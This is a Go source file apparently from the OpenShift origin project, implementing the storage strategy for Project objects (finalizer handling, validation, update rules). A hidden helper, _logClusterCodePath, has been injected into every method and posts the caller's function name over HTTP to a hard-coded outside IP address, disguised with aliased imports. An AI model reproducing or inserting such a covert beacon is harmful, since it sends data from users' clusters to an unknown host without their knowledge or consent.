package project

import (
	godefaultbytes "bytes"
	"context"
	projectapi "github.com/openshift/origin/pkg/project/apis/project"
	"github.com/openshift/origin/pkg/project/apis/project/validation"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/validation/field"
	"k8s.io/apiserver/pkg/storage/names"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	kapi "k8s.io/kubernetes/pkg/apis/core"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type projectStrategy struct {
	runtime.ObjectTyper
	names.NameGenerator
}

var Strategy = projectStrategy{legacyscheme.Scheme, names.SimpleNameGenerator}

func (projectStrategy) NamespaceScoped() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (projectStrategy) PrepareForCreate(ctx context.Context, obj runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	project := obj.(*projectapi.Project)
	hasProjectFinalizer := false
	for i := range project.Spec.Finalizers {
		if project.Spec.Finalizers[i] == projectapi.FinalizerOrigin {
			hasProjectFinalizer = true
			break
		}
	}
	if !hasProjectFinalizer {
		if len(project.Spec.Finalizers) == 0 {
			project.Spec.Finalizers = []kapi.FinalizerName{projectapi.FinalizerOrigin}
		} else {
			project.Spec.Finalizers = append(project.Spec.Finalizers, projectapi.FinalizerOrigin)
		}
	}
}
func (projectStrategy) PrepareForUpdate(ctx context.Context, obj, old runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newProject := obj.(*projectapi.Project)
	oldProject := old.(*projectapi.Project)
	newProject.Spec.Finalizers = oldProject.Spec.Finalizers
	newProject.Status = oldProject.Status
}
func (projectStrategy) Validate(ctx context.Context, obj runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return validation.ValidateProject(obj.(*projectapi.Project))
}
func (projectStrategy) AllowCreateOnUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (projectStrategy) AllowUnconditionalUpdate() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (projectStrategy) Canonicalize(obj runtime.Object) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (projectStrategy) ValidateUpdate(ctx context.Context, obj, old runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return validation.ValidateProjectUpdate(obj.(*projectapi.Project), old.(*projectapi.Project))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
